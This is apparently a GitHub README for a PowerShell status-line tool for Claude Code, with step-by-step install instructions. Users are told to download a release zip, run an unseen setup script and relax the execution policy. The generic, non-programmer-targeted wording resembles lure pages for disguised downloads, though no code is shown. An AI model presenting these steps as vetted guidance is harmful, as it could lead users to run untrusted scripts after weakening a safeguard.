# ⚙️ ClaudeCodeStatusLine - Real-Time Status for Claude Code

[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)

ClaudeCodeStatusLine is a tool that shows useful information about Claude Code right in your terminal. You can see the current model, token counts, rate limits, and git details as they update. It helps keep track of your coding context without needing to open extra apps.

## 🔍 What Is ClaudeCodeStatusLine?

ClaudeCodeStatusLine adds a custom status line to your command line interface. This status line updates in real-time to show:

- Which Claude model you are using  
- The number of tokens used in your current session  
- Current rate limits so you avoid hitting limits  
- Git information like branch and commit details

It runs in your terminal (PowerShell or other shells) on Windows. You do not need to understand programming to use it. The tool works in the background and updates automatically.

## 🖥️ System Requirements

Before you get started, make sure your computer meets these needs:

- Windows 10 or later  
- PowerShell 5.1 or newer (comes pre-installed on Windows 10+)  
- At least 100 MB of free disk space  
- Internet connection for downloading and for real-time data  

These requirements help ensure ClaudeCodeStatusLine runs smoothly and updates data quickly.

## 🚀 How to Download ClaudeCodeStatusLine

Click the large button below to go to the download page. From there you will find all needed files.

[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)

You will be taken to the GitHub project page, where you can download the software package. The files include everything you need to run it on Windows.

## 📥 Step-by-Step Installation Guide

Follow these steps to get ClaudeCodeStatusLine running on your PC:

1. Visit the download link above.  
2. On the GitHub page, look for the **Releases** section. Find the latest release version (the top one).  
3. Download the zip file for Windows. It will have a name like `ClaudeCodeStatusLine-Windows.zip`.  
4. Open the downloaded zip file using Windows File Explorer.  
5. Extract the contents to a folder you can easily access, such as `C:\ClaudeCodeStatusLine`.  
6. Open PowerShell. You can do this by clicking the Start menu, typing `PowerShell`, and selecting it.  
7. Change directory (folder) to where you extracted the files. For example, type:  
    ```
    cd C:\ClaudeCodeStatusLine
    ```  
8. Run the setup script by typing:  
    ```
    .\setup.ps1
    ```  
    This script will configure your terminal to show the custom status line. If prompted, allow PowerShell to run this script.  
9. Restart PowerShell to see the status line active.

If you run into any errors, check your PowerShell execution policy settings. You may need to allow script running by typing this command with administrator rights:  
```
Set-ExecutionPolicy RemoteSigned
```
Then try step 8 again.

## ⚙️ Using ClaudeCodeStatusLine

After installation, the status line appears automatically whenever you open PowerShell. Here is what the pieces mean:

- **Model Name**: Shows which Claude AI model is active.  
- **Tokens Used**: Counts tokens processed in your current tasks.  
- **Rate Limits**: Displays remaining requests allowed before limits reset.  
- **Git Info**: Shows the current branch and latest commit hash if you are in a git repository folder.

This live information helps you understand your current environment without switching windows or running extra commands.

## 🔄 Updating ClaudeCodeStatusLine

To update to the newest version:

1. Return to the download page using the button above.  
2. Download the latest zip file.  
3. Extract the new version files over your existing installation folder.  
4. Restart PowerShell to load the updates.

It is safe to replace files in the installation folder. Your settings and usage data remain intact.

## 🛠 Troubleshooting Tips

- **Status line does not show after setup**: Make sure you restarted PowerShell and ran the setup script as described.  
- **Script blocked due to security settings**: Adjust execution policy with `Set-ExecutionPolicy RemoteSigned`.  
- **Git info missing**: Check you are inside a git repository folder. Try running `git status` to verify.  
- **Model or token info not updating**: Confirm you have an active internet connection.

If problems continue, check for detailed logs in the installation folder or reach out through GitHub issues (no programming knowledge needed to report what you see).

## 📚 More About ClaudeCodeStatusLine

ClaudeCodeStatusLine uses standard terminal tools and PowerShell scripting. It interacts with Claude Code APIs to fetch details on models, tokens, and rate limits. It also runs git commands to gather version control information.

Built for developers, it is also easy to set up by end users who want a quick overview in their terminal window.

## 🔗 Useful Links

- Main repository and downloads:  
  https://github.com/Scorpiolover/ClaudeCodeStatusLine  
- PowerShell documentation:  
  https://learn.microsoft.com/en-us/powershell/  
- Git for Windows:  
  https://git-scm.com/download/win  

Use these resources if you want to learn more about the technologies behind ClaudeCodeStatusLine.